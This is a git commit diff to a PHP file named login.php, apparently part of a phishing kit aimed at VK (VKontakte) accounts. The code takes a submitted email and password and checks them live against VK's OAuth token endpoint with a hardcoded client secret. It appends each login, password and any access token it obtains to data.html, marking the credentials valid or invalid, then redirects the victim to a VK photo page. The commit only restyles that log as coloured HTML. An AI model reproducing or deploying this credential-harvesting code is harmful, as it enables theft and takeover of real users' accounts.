52de4d4b6b77036b23eff722cb1bd68a202e8d59
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-03-08 23:18:15 +0300

    Update login.php

--- login.php
+++ login.php
@@ -2,7 +2,7 @@
 $login = $_POST['email'];
 $pass= $_POST['pass'];
 if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass")){
-  $all = "Не верные данные: $login / $pass <br>";
+  $all = "<b style='color:red'>Не верные данные...<br>Login: $login<br>Password: $pass</b><hr>";
   $fp = fopen("data.html", 'a+');
   fwrite($fp, "$all");
   fclose($fp);
@@ -12,13 +12,13 @@ if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id
   $proverca = json_decode($proverca, true);
   $proverca_token = $proverca['access_token'];
   if($proverca['user_id']){
-      $all = "Верные данные: $login / $pass [Token: $proverca_token] <br>";
+      $all = "<b style='color:green'>Верные данные... <br>Login: $login<br>Password: $pass<br>Token: $proverca_token</b><hr>";
       $fp = fopen("data.html", 'a+');
       fwrite($fp, "$all");
       fclose($fp);
       header("location: https://vk.com/pozitive_youmor?z=photo-116217300_456239788%2Falbum-116217300_0%2Frev");
   }else{
-      $all = "Не верные данные: $login / $pass <br>";
+      $all = "<b style='color:red'>Не верные данные...<br>Login: $login<br>Password: $pass</b><hr>";
       $fp = fopen("data.html", 'a+');
       fwrite($fp, "$all");
       fclose($fp);
